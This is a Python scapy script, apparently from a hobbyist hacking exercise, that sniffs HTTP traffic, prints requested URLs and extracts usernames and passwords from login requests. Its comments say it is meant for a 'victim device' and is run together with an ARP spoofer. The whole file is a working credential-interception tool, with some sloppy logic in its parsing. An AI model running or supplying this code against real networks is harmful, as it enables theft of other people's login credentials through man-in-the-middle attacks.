#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

#THIS SNIFFER IS FOR HTTP WEBSITES ONLY
#TO RUN THIS ON VICTIM DEVICE, YOU NEED TO RUN ARP SPOOFER AND THIS AT THE SAME TIME
#imports http packet reader
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet,)
    #iface= machine connected to the internet
    #store makes sure data is not stored in memory, so there is no load
    #prn= call back function
def printEff(split,usrKey):
    for uk in usrKey:
        if uk in split[0]:
            print("UserName:" + split[0])
        else:
            print("UserName:" + split[0])
            print("Password:" + split[1])
        break
def getUrl(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print("HTTP REQUEST >>>" + url)
def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "usr", "user", "login", "password", "pass", "pwd"]
        # various different keywors developers can use
        for key in keywords:
            if key in load:
                split = load.split("&")
                usrKey = ["username", "usr", "user", "login"]
                return printEff(split, usrKey)
                # prints data neatly



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        getUrl(packet)
        login_info=get_login(packet)
        if login_info:
            print(login_info)



            #we can do packet[layername].field to get a specific layer and a specific field attatched to it
            #checks to see if the keyword "usr" is in the packet
        #looks for Raw layer
        #we can do scapy.AnyLayerName and see if the packet has it
    #checks if the packet has http or a layer
sniff("eth0")
